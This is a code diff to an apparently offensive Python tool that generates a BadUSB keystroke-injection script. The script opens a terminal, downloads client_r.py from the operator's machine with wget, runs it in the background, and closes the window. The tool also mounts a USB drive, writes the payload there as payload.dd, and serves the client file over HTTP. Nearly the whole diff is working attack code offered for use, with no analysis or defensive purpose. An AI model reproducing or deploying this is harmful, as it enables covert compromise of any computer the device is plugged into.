@@ -34,11 +34,38 @@ with open(client_py_path, "w") as f:
 
 # change the payload of the badusb
 
-badusb_payload = "wget http://{local_ip}:8000/client_r.py -O /tmp/client_r.py && python3 /tmp/client_r.py"
+badusb_payload = """CTRL-ALT T
+DELAY 1000
+STRING (wget http://{local_ip}:8000/client_r.py -O /tmp/client_r.py && python3 /tmp/client_r.py) & disown; exit
+ENTER
+"""
 
+print(badusb_payload)
+usb_mount_path = "/mnt/usb"
+# unmount the USB drive if it is already mounted
+def unmount_usb():
+    try:
+        subprocess.run(["umount", usb_mount_path], check=True)
+        print("[+] USB drive unmounted successfully.")
+    except subprocess.CalledProcessError:
+        print("[!] Failed to unmount USB drive. It may not be mounted.")
+unmount_usb()
 # check if the usb is mounted
-usb_mount_path = "/media/usb"
+if not os.path.exists(usb_mount_path):
+    os.makedirs(usb_mount_path)
+# Mount the USB drive if it is not already mounted
+def mount_usb():
+    try:
+        subprocess.run(["mount", "/dev/sda1", usb_mount_path], check=True)
+        print("[+] USB drive mounted successfully.")
+    except subprocess.CalledProcessError:
+        print("[!] Failed to mount USB drive. Make sure it is connected.")
+mount_usb()
 
+# Write the badusb payload to the USB drive
+badusb_file_path = os.path.join(usb_mount_path, "payload.dd")
+with open(badusb_file_path, "w") as f:
+    f.write(badusb_payload)
 
 # Step 2: Serve only client.py via HTTP
 class SingleFileHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
